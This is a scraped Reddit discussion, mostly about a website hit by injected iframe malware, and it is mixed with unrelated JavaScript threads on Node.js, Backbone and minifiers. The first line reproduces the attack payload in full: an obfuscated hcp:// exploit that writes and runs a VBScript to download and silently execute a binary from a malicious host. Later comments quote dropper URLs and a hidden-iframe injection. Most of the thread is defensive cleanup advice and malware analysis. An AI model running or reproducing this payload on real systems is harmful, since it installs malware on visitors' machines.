 var iframe = "&lt;iframe src=\"hcp://services/search?query=anything&amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&lt;script defer&gt;Run('cmd /c echo FileName ! @&amp;#8470;TEMP&amp;#8470;}file.exe@&gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo url!@http://wmdbmblq.c0m.li/w.php{f!17&amp;e!7@ &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo Set objHTTP ! CreateObject(@MSXML2.XMLHTTP@)&gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo Call objHTTP.Open(@GET@, url, False)&gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo objJOPA&gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo set oStream ! createobject(@Adodb.Stream@)&gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo Const adTypeBinary ! 1 &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo Const adSaveCreateOverWrite ! 2 &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo Const adSaveCreateNotExist ! 1 &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo oStream.type ! adTypeBinary &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo oStream.open &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo oStream.write objHTTP.responseBody&gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo oStream.savetofile FileName, adSaveCreateNotExist &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo oStream.close&gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo set oStream ! nothing &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo Set xml ! Nothing &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo Set WshShell ! CreateObject(@WScript.Shell@) &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo WshShell.Run FileName, 0, True &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo Set FSO ! CreateObject(@Scripting.FileSystemObject@) &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs]]echo FSO.DeleteFile @&amp;#8470;TEMP&amp;#8470;}go.vbs@ &gt;&gt;&amp;#8470;TEMP&amp;#8470;}go.gPs|cscript &amp;#8470;TEMP&amp;#8470;}go.gPs&gt;nul'.replace(/!/g, String.fromCharCode(61)).replace(/@/g, String.fromCharCode(34)).replace(/]/g, String.fromCharCode(38)).replace(/{/g, String.fromCharCode(63)).replace(/JOPA/g, String.fromCharCode(72,84,84,80,46,83,101,110,100)).replace(/gPs/g, String.fromCharCode(118,98,115)).replace(/}/g, String.fromCharCode(92)).replace(/&amp;#8470;/g, String.fromCharCode(37)));&lt;/script&gt;\"&gt;"; via: wmdbmblq.c0m.li/content/cph2.php?c=17 (don't visit) Known exploit: http://seclists.org/fulldisclosure/2010/Jun/205 There's also a couple other things happening, like the Java applet. 
you should take the site offline completely, and depending on the severity of the infection build a completely new clean environment and deploy the application from the known good version in source control. 
That sounds good, thanks! Where do you set up event handlers? Do you add them to the views?
Get it clean first before people getting infected with it. The site embedded hxxp://tlunwpz.ce.ms/count13.php which point to a few site contain drive-by exploit via browser exploit. Once it's success, it download a binary from hxxp://wmdbmblq.c0m.li/w.php?f=17 which is a dropper. http://www.virusupload.com/report/?id=ceff18a041d5eea0a6d17ba2751b1f52167746bc 
Iframe hack. Suspend the user if they refuse to clean up. 
Get a new host ASAP. 
&gt;On the other hand the password to the hacked server was like (company name)123 Wow, that's just irresponsible. 
Yeah, forget brute force, that's guessable.
Additionally, make sure any software packages you're running (like wordpress, etc) are up to date. I got hacked a while back because phpThumb had a security hole it in -- took me forever to track it down.
the cufon file was uploaded by hackers.
FYI, this is not encryption, it's just obfuscation. Encryption would be if you needed a (secret) key to decrypt. This is just an obscure way of writing the code. Not being an ass, just providing another TIL hopefully.
This is your code decoded: edit: made it pastebin. http://pastebin.com/RZrwbY7j
In that case you need to do whatever you can to sever this relationship if their attitude does not change. That sort of attitude isn't what you want if you have to entrust data to them.
i wrote to him that someone injected code into the website. He went like "oh I see there are some 3 js lines in the index.php, but I deleted them and everything is perfect now." When I asked him to changed password he told me there is no need since he already fixed it. After few minutes another line of this iframe thing was back in index.php, so I mailed him again, but he went to the lunch and changed the password after he was back.
I don't think I have access to ssh, only to ftp. I used totalcommander though and alt+f7 searched for text. the iframe was injected in 27 files each time before&lt;/body&gt;(all files that had &lt;/body&gt; tag). the other files were unharmed(I hope).
ugh, that guy should not be in charge of a server. Everyone knows.... when your server is hacked, you do not take lunch, you order Chinese. Work non-stop until every password is changed and you've pinpointed their point of entry and the hole is closed. Is he even working finding the hole in security?
Personally I would say that a compromised server means it is time to reinstall and restore from clean backups.
Try to find a hoster that does not use insecure protocols l like FTP as anymore.
I wouldn't be surprised if every php/html file on the server had that script by now. It'd be best for your users to take the server down until you know it's all clean, and check your own computers in case the exploit pack worked on you, if you have any browser plugins that weren't up to date. If they just exploited a website bug (like in an old wordpress, or any other common package you use), you might be able to just delete and reupload a new version. If they actually got root privileges, or you're unsure, they could leave all sorts of backdoors or worse and such and it may be better to nuke and pave.
Obviously you have a security hole in some of the code you've written that allows some form of remote code execution. Take all the code offline immediately (or it will just happen again) and go through it looking for anything that accepts input from the user ( $_GET, $_POST, $_REQUEST, etc. ) - you've failed to sanitize it properly.
&gt; I wouldn't use PHP as an example of what not to do. It's pretty much the &gt; most widely used and supported language out there for dynamic web &gt; content. I don't get in this debate anymore, it's pointless. If the best argument you have for your language/tech stack is it's popularity among novices then it would probably be good to find a better argument. If you want to know the problems with callbacks or continuation passing style they are easy to google and it's pretty apparent from the library development of Node and other systems that the first thing developers do is write software to make it easier to write CPS style code in a more linear way.
the website was developed by the admin, who took 4 hours to change the password to the server. I have no idea what resources he used. The owners of the company didn't like his attitude(now I know why) and so they asked me to take care of the website(simple updates like change phone number, opening hours etc). The application I am developing(registration system), was fully written by me. I didn't make use of any other apps. The only js files I included in the system were from github or jquery. The password to the ftp was however in the form: "Reddit1234", where Reddit would be name of the company(the moment I got the password I told my employee it is kinda insecure). I really hope that the lame password was why I got hacked and not my application, cause that would just fuck up my week... 
I'd start by searching with google for how to learn anything: sql, python, whatever. I still have no idea what 'reference sheet' really means.
Forget changing the passwords, they have no idea if they were rooted or what the intruder left behind. You have to rebuild the server from the bottom up, no questions. Of course changing the passwords is part of that process.
You should really post this again, or a link to it, in /r/netsec where there are folks who know more about this kind of stuff than we do here in /r/javascript. Take all the advice here with a massive grain of salt. Mine included. Security is hard.
&gt; there are now decades of opinion on why continuation passing style...is a more error prone and complicated way to program Can you cite any evidence? Or, is it just anectdotal evidence?
I like the YUI Compressor. It requires zero effort and the result is fairly good. If your code passes JSLint, the YUI Compressor won't break it. The Closure Compiler offers better results, but it requires quite a bit of additional work. E.g. you have to write some things in a very specific style, which wasn't an option for me. Uglify is somewhat less troublesome and the results are comparable to CC. So, either go with this one or YC. There are also super basic compressors like JSMin, which basically just strip white space. Don't bother with those. If you add an extra step to your pipeline it should better be worth it. **Edit:** TIL YC strips `'use strict';`. That's bad. :/
There are some interesting control flow library experiments going on in Node right now that will probably be very useful to language designers in the future. It's always great to have this kind of enthusiasm and experimentation going on. I think the fact that these are so popular as well as the history of development with CPS style programming having constantly hit a complexity wall and being considered a mistake is strongly suggestive but it's true that there is no definitive answer yet. In the end, my money is on the solution that everyone always ends up with, some abstraction providing a threaded style (probably with message passing since it fits the sensibilities and it's a popular meme now) overtop of the async/callback mess that the language forced on Node.js I'm not sure what can be done by the community, but the response to the Dzubia post was really depressing. I had been following Node.js for a while and was planning on using it on some hobby project or another to play around with it soon. Not anymore, if that's the level of debate or thought typical of the community then I'll just skip it, there are too many other promising projects I would feel good about contributing to and would be excited to use to risk wasting my time. Open source projects like Node.js depend on good 3rd party libraries, which means that you need to attract smart, competent people to write them. If they all leave your community you end up with PHP.
well, that was that password, there could very well be another that's even less secure and can be brute forced. We once had a mail server that all the sudden started sending out tens of thousands of email a minute, we had gotten on tons of blacklists, and everything coming from our server was marked as spam, no matter what. We scrambled, looking for a hole, trying to see what was compromised, then we found that all the mails were coming from one account. So we contacted that person. Come to find out her username was "Kathy" and her password was... wait for it... "Kathy!" From that day forward, we required a mix of letters and numbers for passwords.
I have no idea how secure the website is. I should assume it is secure, since it was made by guy with 10 years of experience. every file(except 2) in the system I am developing starts with: require('access.php'); access.php contains: &lt;?PHP header('P3P: CP="CAO PSA OUR"'); session_start(); if (!(isset($_SESSION['privilages']) &amp;&amp; $_SESSION['privilages'] != '')) { header ("Location: login.php"); die(); } ?&gt; The 2 files that do not start with require('access.php') are: * login.php * and the file that processes the form from login.php. login.php accepts input not longer then 30 chars. In the process file I use $_POST to get the username and password from login form and then pass it to mysql. I guess I should check if it input is less then 30 chars before passing it to msql yes?
The goal is fewer packets sent across the wire, and fast processing on the other end. This too does that great. What does it matter whether obfuscation or minification is the choice?
But... but... why?! Unless they also uploaded their own customized cuffon library and used the cuffon fonts to disguise tons of code... but that doesn't make sense. At all.
I'm sorry your server got hacks and hope you find a more reliable host. However I'm still trying to figure out what the fuck the sith have to do with it. Was this some kind of Star Wars website?
now this is useful for all the web 2.0 app builders since these days information get stolen pretty easily... 
&gt; When I asked him to changed password he told me there is no need since he already fixed it. I just threw up a little.
What kind of evidence? Do you mean some kind of large scale study where the same project was done with both styles many times by multiple different teams in order to get a statistically significant result of which is actually better? I'm not aware of one, no. That's not something that's done in computer science unfortunately, because it's fantastically expensive and we don't actually know how to control for the variability of this kind of complex social arrangement. That's why I said "decades of opinion", because it is the opinions of experienced experts that's considered as it's the best we have. Pretty much any debate on programming methodology comes down to this. The only other weak form of evidence we have is that in ecosystems where both styles are popular and possible the threading model is by far the most popular for exactly the reasons I previously cited. TLDR; No, I have no evidence if you define evidence scientifically, all I have is the same weak evidence we have that meaningful variable names are good, gotos are generally bad and type inference is good. Also, I type too much in response to troll questions.
&gt;It could roll a die to decide what it does I wish more virus / trojan authors took this approach, could be a nasty virus or it could be a funny picture, joke or kittens maybe? Such an implementation might help it spread.
The length of the input isn't the issue. It's whether you use something like mysql_real_escape_string to make sure it doesn't contain any SQL commands. However even sql injection doesn't directly give an attacker arbitrary filesystem read/write capabilities. Try looking at the server logs to find out how the attacker got access.
I would presume the whole things is infected, have you got a local copy that you trust? Change your host and reupload the site.
Yes, you instantiate a view with reference to a model (or collection). And in the view you can bind the 'change' event of the model to the 'render' function. Something like the following: MyView = Backbone.View.extend({ initialize: function() { this.model.bind('change', this.render); }, render: function() { $(this.el).empty(); $(this.el).html(this.model.get('someDataToRender')); } }); myModel = new Backbone.Model(); myView = new MyView({model: myModel}); 
I'm visiting that site now, and de-obfuscating the js on there site. [This](http://pastebin.com/8wGyB4ZN) is the closest I have got so far. EDIT: this is the java archive which is executed by the js: http://wmdbmblq.c0m.li/content/g43kb6j34kblq6jh34kb6j3kl4.jar I will attempt to decompile the jar. EDIT2: WTF? The jar downloaded is pretending to be a JSON parser... EDIT3: Wow this is difficult to deobfuscate. Just found out that large amounts of code was being used just to obfuscate the string: "http://wmdbmblq.c0m.li/w.php?f=17&amp;e=1" EDIT4: Finally, figured it wtf all the code is doing :) (feeling very proud of myself). The code downloads the file from http://wmdbmblq.c0m.li/w.php?f=17&amp;e=1, gives it a random name, and then executes: regsvr32 -s "&lt;name of file&gt;"
I am genuinely interested in how you obfuscated this. 
10 years of experience does not mean the guy is any good, or that your site is secure. How many years of experience does Microsoft have, yet there are still vulnerabilities in their code.
&gt; I should assume it is secure, since it was made by guy with 10 years of experience. Hell no you shouldn't. People find security holes in Google, Facebook, and Twitter, companies with some of the best engineers on the planet. I've personally found loads of holes in sites from Google, Best Buy, Mozilla, Coca Cola etc. People make mistakes.
after imaging for post-mortem. if you have a security hole in your code, it likely still exists in the backup.
who is the provider?
Didn't see that. Thanks!
that's actually called a [throbber](http://en.wikipedia.org/wiki/Throbber). this is a spinner: http://www.objis.com/formationextjs/lib/extjs-4.0.0/docs/Ext.form.field.Spinner.png
Thank you!
Something similar recently happened at my work. They got in via a compromised WordPress blog (insecure password) and modified every index.php. file on the server. I didn't notice because it hid itself from the page if it detected curl or Linux in the user agent. Very sneaky.
I fetched the file referenced in that pastebin and decoded it, the contents are as follows: http://pastebin.com/uV5a2dhQ Simply the nature of the attack leads me to believe this is some sort of exploit kit(because malicious actors that use exploit kits, also hack redirects into sites to increase their profitability), but after some decoding you can see the business end of the exploit kit much more clearly. If you look at the beginning of the code, you can see references to different types of software. This is version checking- important if you want the right exploit aimed at the right version of software. If you see some of the occurrences of "clsid:", those are pretty directly tied to vulnerabilities in Java. . You might also see some references to secondary files: &lt;embed src=""+fname+".swf" (fname is a variable references earlier which has part of the file name) return 'content/score.swf' If you grab them you will see they are very short files, although it looks like there's either some traffic diversion going on or something because they are not available without me putting in more effort- and you wouldn't gain anything from seeing the files anyways. 
*un*obfuscated :-)
Yeah I typed "Deobfuscated" but spellcheck raped it back to obfuscated. 
According to my AV, it's a JS/Iframe.AS trojan.
Maybe the malware server just check the http referrer to decide if it serve the malicous code or not. This way it makes it a little bit harder to get the trojan code for reverse engineering.
I listed 5 solid reasons, - if your not wanting to use javascript on the server, - and your not using websockets, - and your not talking to a whole range of different network end points, - and you don't care about active open source communities - and you don't care about finding a sweet spot between performance and community activity. (node.js is fast, but of course haskell and erlang are faster) - and you already know how to solve your problems in other stacks Then just ignore node.js. As an aside the article of blocking io vs non blocking io stands. And non blocking io wins on performance. But you don't need node as your implementation of non blocking IO. You could do it in .NET / Java / Erlang / yada yada. Of course node has one of the best OSS non blocking IO communities. With non blocking IO if you use a single 3rd party blocking IO library your entire web stack has a massive bottleneck. This is an easy mistake to make in .NET / Java but you should be able to avoid it with competence. Of course in node.js every library is non blocking by default.
It doesn't do any of those things better. It's not meant for generic CRUD applications
I will look into php doc and see about mysql_real_escape_string. On the other hand when I input ' into the forms it changes into \'(I check it long ago). I have no idea though what happens if I try to pass ' through get. BTW. is putting raw ' into the input, the onlyway of sql injecting or it is still possible to sneak it in?
I disagree with abstraction providing a threaded style. Personally I believe you need to not write asynchronous code in a synchronous style because you'll forget it's asynchronous. Writing the code in an asynchronous style forces you to accept it's asynchronous and think about your code in an asynchronous manner. Any synchronous abstractions will just lead to you writing less performant abstractions 90% of the time. Synchronous code style abstractions leak. And if they don't leak then your clearly competent and then async vs sync is just a style preference (my style preference is async). Sure async is a pain to write but I like the idea behind it. As for the response to dzubia's post, well he's a troll, so clearly the way you deal with trolls is give mediocre responses. He's points were void anyway. node.js has plenty of competent developers. There are a lot of good guys out there. I've recently found that a lot of people actually have a negative view of the node community. If you were wearing my shoes you would see it differently.
i scaned my computer in safe-mode with todays version of kaspersky and AVG. it says I'm clean. I am still waiting to receive the log of what files have been edited since yesterday.
I am afraid I will be forced to do that.
I don't think JS uses opcode compilation. It has a JIT compiler and a bloody fast one at that. Besides you shouldn't worry about JS performance, V8 is fast, real fast. one should not underestimate V8. It's about 3/4 times slower then C on average compare to PHP being about 40 times slower then C As for script depencency, they are cached. i.e. `require("script1"); require("script1");` will return the same object both time (the require function is memoized).
I have no idea why, but neither I nor the previous developer of the website used cufon. The cufon files have also been uploaded 4 times between 10 to 14 today - the same amount of times the js code was being added to files with &lt;/body&gt;tag. The files also differed.
I don't really know since I only received ftp user/password and mysql user/password. however when I pinged the server and used whoisbyip I got this website http://serveradmin.pl/. I am afraid it's only in polish. 
I don't really know since I only received ftp user/password and mysql user/password. however when I pinged the server and used whoisbyip I got this website http://serveradmin.pl/. I am afraid it's only in polish.
something* Or did I not catch your sarcasm over the internet ;)?
I though it would not be encryption, but I have never before encountered such code so I had no idea how to name it. Now I know. Thx!
I didn't make use of any packages. I am not sure though if the website developer didn't.
There are LOTS of ways of injecting sql. ANY string that goes into a database query that comes from the user MUST be run through mysql_real_escape_string first, unless you're using mysqli prepared statements. Keep in mind that this includes SELECT statements too, not just INSERTs
regarding the passwords I am pretty sensitive about that. Lately I was in my GF's university trying to get access to the eduroam(uni network). They required to set up a password for eduroam service, so I input my basic most common password. It was to complex and the system didn't accept it. In the system I am developing when users define their passwords it has to be 8 characters with lower case, upper case, number, special char or at least 24 characters.
When I investigated it a while ago, this didn't seem to be an option. Have they added that recently?
I guess tracert the iframe src wouldn't tell us much, would it?
I have to second this. I always clone unsolved mysteries before destroying them.
:(
I know. And I have like 2 days to do it, because they enter groupon on Wednesday...
FTP allows multiple log in attempts so an easy password is easily compromised by a rainbow attack. Also FTP passwords are also captured by keyloggers. Make sure all PCs you own are scanned for viruses by a name brand AV (bad guys often promote fake AV). Never log in on public WiFi (easy to eaves drop on your password). Of course the server itself could have been compromised in some way and passwords stolen. It is likely that the hackers placed a back door shell script somewhere. This will allow them to continue to hack your account. Easiest thing to do is delete and re-upload clean files from a back up. Google will blacklist your client OP. Use this as motivation to change webhosts and clean up there website code. 
Ah, i need to learn correct formatting. Thanks.
I didn't know any of that. I looked up an example and got what i know from that. Thanks!
How in the hell did you get "something" from "sth"? Fucking spell it out and stop making up words. For the love of God.
"calc.exe" ...classy.
I would say sever it anyway, at this point you can't tell if they're actually working on it or if they're bsing you, and even if they do now have good intentions they're clearly not knowledgeable enough to be in the position they are in the first place.
Oh, I agree. Taking a backup of the compromised system is a good idea. I just typed that on my phone so I didn't want to go into all that detail.
This code cretes an iframe that points to [BlackHole Exploit kit](http://thehackernews.com/2011/05/blackhole-exploit-kit-download.html)
Do NOT save the new password in your FTP client before scanning your system. It was probably [mallware that steals FTP account configs](http://blog.unmaskparasites.com/2009/09/23/10-ftp-clients-malware-steals-credentials-from/) from popular clients (like Total Commander), connects to your servers and adds its code. I've seen one that has uploaded a SEO link farm to one of my frends' servers and added links to his pages just at the and of index.* files. Another one added mallware links which resulted in the site being blacklisted by Google (the big red malicious website alert when you try to navigate to infected domain).
If it's a string input then ' and \ are the only ways of injecting. If it's a numerical input... well better make sure it's a number. That said, I think it's more likely you were hacked due to a misconfiguration somewhere.
Because minified code can be retrieved and read. Its only missing comments and white space. It is, at times, necessary to retrieve compressed code for a variety of reasons. There is no telling what is happening if every named property is altered or the logic is entirely rearranged to achieve a like interaction. Not knowing the difference is ignorance of common practices. Practicing in that ignorance is harmful. Furthermore, the goal is not fewer packets sent across the wire. The goal is reduction of costs. If you send a couple fewer packets and result in a management complication later on you have likely failed to achieve your goal, and again you are operating in ignorance.
+1. Always make a backup of the hacked setup, so once things calm down you can look though everything and see how it all went down.
I was afraid of it, since I had few more connections saved in my total commander. Fortunately to the other servers no code was injected(at least not this type of code). Nevertheless administrators of other servers have been alerted and they immediately changed the passwords. The will also keep closer look at the logs for the few coming weeks.
vm
When I was 15, I traveled to Canada. I met those cute Italian sisters I used to hang out with. One of them, when texting, always used 'sth' instead of 'something'. Since then I used it all the time in the mails/fb chat/WoW/SC2. Being completely honest, this is the first time, someone did not understand it and told me that. I am afraid I have confused tons of people for the past few years...
Does this application allow uploading of files? If you don't check your file extension, people can fake the MIME type as an image and upload PHP files, then they can run PHP shells and do whatever to your server. I don't know if they got access beyond that. It's hard to tell from the information provided, but it's possible that they are just uploading PHP files and editing your documents via the php shells.
Yeah, you probably have. The other day my best friend, who happens to be a girl, sent me this text message: "I miss you! ({})" And I was like, "Did you just say you missed me and send me an emoticon of your spread eagle vagina?" And she was extremely offended. Apparently she had been using "({})" as an emoticon meaning "hug". I bet she confused lots of people too, myself included.
This isn't true. An iframe injection into a hosted file exposed worldwide doesn't mean "reinstall the server", it means "correct this particular users' files with proper security".Even worse, in your scenario the problem wouldn't even be corrected. 
I'm not entirely sure why you say "probably malware". In around 7 years of working in shared hosting (or at least in a capacity to handle the abuse complaints for multiple shared hosts) I'd say around 10%, if that, of individual compromises take this form. 
Get a knew host.
ಠ_ಠ Yes, questions. If you know how the file was injected, and understand how to fix it, reinstallation is not the answer, particularly in this case. 
http://xkcd.com/936/
I'm having a similar problem but I don't want to derail this post so I've posted here: http://www.reddit.com/r/javascript/comments/mkrig/i_also_found_code_in_my_files_i_did_not_add_what/ Thanks!
I've seen similar symptoms before: appending content to files on someone's server. Three times out of three it was a trojan on the client machine that has accessed the server by stealing saved passwords from FTP client. Are there more probable ways that some potentially malicious code has been added to page source? From my perspective compromised/infected client machine is more probable than a targeted attack from outside.
...you close the big box, but the little box still has access. 
Any chance you're using a CMS like Wordpress to manage the site? 
http://wmdbmblq.c0m.li/main.php is what that count13.php file redirects to. I viewed the source. I'm on my phone at the moment so, can't un-obfuscate it right now. I noticed that it is registered to some guy in the Netherlands. If you want me to do more investigating, let me know. 
What else may have been modified? What if the intruder got root? You can't trust a compromised system. Unless they use something like tripwire and know exactly what has changed and what to revert or restore then they can't know how to undo everything. Running grep on /var/www/html (or equivalent) is not the solution. Not even close. Just because you're paranoid doesn't mean they're not after you. Why take chances? Especially if you have users and are trusted with their data. That's not a chance you should feel is even your choice to make.
You should be able to say without question what the attacker modified, and ffs determine whether they got root (or had a good chance to) without reinstalling. Nor did I suggest that a blind grep was the solution...*understanding* the nature of the attack is. Why take chances? Well to start with, because every substantial shared hosting operation would be reinstalling every 48 hours with you as a CTO. With a good 20 hours of downtime while some 2TB /home gets copied over, for a locally compromised account, that ought to be interesting. Netsec doesn't mean blindly accumulating a list of absolutes that require reinstallation, it means actually knowing what you're dealing with. Given the matter at hand there's likely very little more to do but wiping a user's account and a gentle prodding about script security. 
There was a 0day vulnerability recently released which was a browser attack regarding font files. It basically allows to remotely compromise a user via IE. http://technet.microsoft.com/en-us/security/advisory/2639658 Most likely they were using your site to deliver this payload to unsuspecting victims.
[Bobby Tables](http://bobby-tables.com/)
Blekko offers a [grep the web][1] service. You won't get results immediately, though. You may also be able to get rough estimates by trying a Google search. [1]: http://blekko.com/webgrep
If you have a security hole in a piece of third party software, then restore that, it won't really fix anything. You really shouldn't do anything until you know how it was compromised, otherwise you just took your site down for half a day, and wasted your whole morning accomplishing nothing.
Sounds like you are dealing with an active injection attack. You need to fix the source (patching or blocking) or else it will just come back. If removing something comes right back look for active changes from traffic coming in (packet captures) or check server logs. Sounds like you have a hectic couple days in front of you. Consider contracting with a professional or finding new hosting on fully updated servers to beat your groupon deadline. 
this is so true. If you have a poorly written script, not only would reinstalling everything basically be extreme overkill, it *wouldn't even fix your security hole*
Hahaha - perfect! 
In a situation like this, you can't clean the server up. You have to nuke it from orbit. It's the only way to be sure.
Dude, no one is going to go look at a virus site to try to help you. Go there yourself and copy/paste it into pastebin and give us a link. wtf...
this.
That script tag definitely looks suspicious and needs closer attention. I tried to pull the obfuscated code apart. Maybe this stackoverflow answer will help debug it. btw the code in your site and in the stackoverflow question are different but using the same unpack method. http://stackoverflow.com/questions/2731345/what-exactly-does-this-piece-of-javascript-do
Here you go. I uploaded the suspicious code for OP. Note: I removed the eval() from around the function and reformatted the code. Without knowing exactly what this does it definitely looks sketchy and run it at your own risk. http://pastebin.com/1RH9Wcf6
If the cookie `cookiem=enabled` is not found, this HTML is injected: &lt;div style="position: absolute; left: -1996px; top: -2997px;"&gt;&lt;iframe width="20" height="20" src="http://ausrxvia1epmd.ce.ms/i.php?go=1"&gt;&lt;/iframe&gt;&lt;/div&gt; and the cookie `cookiem=enabled` is set. From what I can see, the document requested serves nothing (blank page), so it probably either (1) tracks hits (sketchy analytics), or (2) requires some preconditions to do anything (which I don't meet). If I had to make an educated guess, this is probably exploiting some bug in some browser or plugin I do not have. **REMOVE IT IMMEDIATELY**, change your hosting provider, change **all** your passwords (including personal e-mail, etc.), scan your local machines for viruses and other malware, search for keyloggers, and eliminate or reduce the possibility of MitM attacks while doing so. For example, do these changes on a trusted friend's computer, use private browsing modes of your browser(s) of choice, ensure you're on HTTPS for all sites, use different passwords for different sites, etc. etc. Tell all your customers (if you have login forms, accept payments, or whatever) that your site has been compromised. Also, figure out why it was inserted in the first place and plug that hole.
There are various font related exploits. If you don't recognize it, it's malicious.
It injects an iFrame, which then injects further code, which injects a flash object. Get rid of the code immediately.
http://pastebin.com/2BNaFEDh Once you've peeled away the encryption you get to there, but even that isn't the end. Code is being used to run Flash.
I was brought along to do some graphic design/marketing stuff - I'm not a Javascript guy at all, just trying to help and learn a little bit. :/
Fascinating, thank you. I can't find this code locally on the servers anywhere. It seems to be only remotely. But we'll come up with a plan. If it's not too complicated, how did you figure out what it was doing?
I got as far as the flash I don't know what it does after that but i can almost guarantee that this is not safe, you need to get rid of the Javascript on the page: function(p, a, c...
Also a [few google results for that domain bring up some information](https://www.google.com/search?gcx=w&amp;sourceid=chrome&amp;ie=UTF-8&amp;q=ausrxvia1epmd.ce.ms#q=ausrxvia1epmd.ce.ms&amp;hl=en&amp;prmd=imvns&amp;filter=0&amp;bav=on.2,or.r_gc.r_pw.r_cp.,cf.osb&amp;fp=1bddd5520996bb0f&amp;biw=1600&amp;bih=1109). Also if you try that domain by itself you get an "This Account Has Been Suspended" page, although I don't know if it's fake or not.
Sorry for the hate.
It gets worse. That iFrame has further encrypted JS which inserts a flash-object, but that is as far as I got. http://pastebin.com/2BNaFEDh 
What's the IP address?
this post just made NOD32 throw a bitch fit 
httparchive.org has downloadable HAR files from thousands of sites. You could mine that data yourself.
My thoughts exactly.
Whoa whoa whoa... You told the server admin the server was compromised and asked him to do a bunch of work because you found some funny code in your files? AND HE DIDN'T IMMEDIATELY DO IT?! At least 90% of the time they didn't get in through FTP. Most of these kinds of hacks are automated and use vulnerabilities in old copies of FOSS (osCommerce, phpBB, etc). Which isn't to say it doesn't deserve a look, but a quick peek at the FTP logs should tell you whether there's an issue or not. And if it's not the FTP account, then quit wasting my time and go update your shitty website. None of the IDS on the server has triggered, and no one else has reported an issue. Go check your HTTP access/error logs and look for anything funny looking. I am the server admin that got messages like this all the time. Trust me, after you receive the hundredth one telling you "OMG YOUR SERVER IS COMPROMISED" because someone's got an unpatched osCommerce install on their site, you stop taking them too seriously unless it really sounds like they know what they're talking about. (The files... What was the modified/created date? Who was the file owner (if you're not using suphp or the like)? *Do* you have any old software on your site?) If it is our problem, it will obviously be resolved without charge. If it's something you've done wrong, we're going to bill you for our time to look into it. I've yet to not bill someone.
&gt; change your hosting provider Why?
If you know what you're doing, you don't have to look at it in a browser - I just went to a bash shell and did a "wget stonewallfarm.com" and it saved the file index.html, which I opened in an editor. Now, if I can just recover my sanity from looking at the ugliest javascript code I've ever seen, I'll be OK. Jeez, don't these script kiddies have any pride! :) 
The admin doesn't sound competent enough to know if they were rooted or not. I'm not saying that in every case you should blindly reinstall but in most cases *if someone is asking /r/javascript what to do*, they should rebuild the server, or get a sysadmin. And if someone is on shared hosting and their admin doesn't want to help them out after being compromised they should switch hosts. (Good thing I'm not the CTO of a shared hosting operation. For more reasons than just my paranoia.)
My point wasn't to trivialize the differences. My point was that this tool does a good job comparing compression schemes. And it does it well. You make a good, strong point. Soften your language a bit and you'll do well here.
Know way!
This happened to my site a few years ago... Someone had found an insecure form and used it to create a directory on my server, as well as inject similar js to what you're seeing. I deleted the site, changed passwords, secured the form in question and loaded it back to the remote.... Sneaky fuckin Russians.
If it's a shared host, root may have been compromised, or some other problem. If it's a VPS, someone may have control over the filesystem. Either way, there's the potential of MitM or data centre takeover. "Assume the worst."
I am not saying that is the only thing one should do. However there is no way to tell if the kernel or any given binary on the system can still be trusted. You might have a dozen different rootkits and might never know. Theoretically you could boot from an external medium and check the hash of all binaries, scripts and data files including scripts as well as the kernel and boot sector but reinstalling is easier.
I am sorry to say that, but it feels somehow comforting knowing I am not the only one who got hacked. Don't get me wrong. It just feels more like a common problem.
thats a weird mix of vanilla DOM with jQuery
It seems to work as long as same origin is satisfied in Chrome. Example var second_window = window.open('http://www.reddit.com/r/Bacon/comments/mkzj8/monday_night_bacon_porn/'); second_window.document.body.style.backgroundColor = "yellow"; So I guess our conclusion is that the same origin policy for DOM access is not just for frames but also for window.open().
NOD32 sucks if it cannot understand the difference between encoded and unencoded text. Install Windows Security Essentials. 
The circle would be complete if we replace pictures of Barack Obama in his home page with Jimmy Wales.
Have you tried [Google Code Search](http://www.google.com/codesearch )? 
if you do a general search there may be some people explaining how they use the plug in but grepping the web would be a very slow process
&gt; use the _. throttle() method with a **named** anonymous function you assign to your event handler. Does it have to be named? 
Sounds like the host has been compromised, take anything you can and run. The code is probably being injected by code running on the server and will never show up locally. Best way to test this is to run a web server on your local machine and see if the code shows on that. 
Seconding this, his box has been pwned and he's reluctant to even change the password? 
Keep e-mail logs and go above his head.
There is a minor typo. `$fn` should be `$.fn`. Also, another way of getting the version number: (function($) { console.log($.fn.jquery); })(jQuery); 
found another part that injects an iframe: http://pastebin.com/jLPJiyQQ good thing that account got suspended: view-source:http://ok56gpnu99o.ce.ms/
You may want replace spaces with hyphen? jpg.to give you better results with hyphens instead of spaces (%20). - var wikiname = $("#firstHeading").text(); + var wikiname = $("#firstHeading").text().replace(/\s+/g, '-'); 
It's called IIFE, really useful javascript idiom. Well explained here http://benalman.com/news/2010/11/immediately-invoked-function-expression/
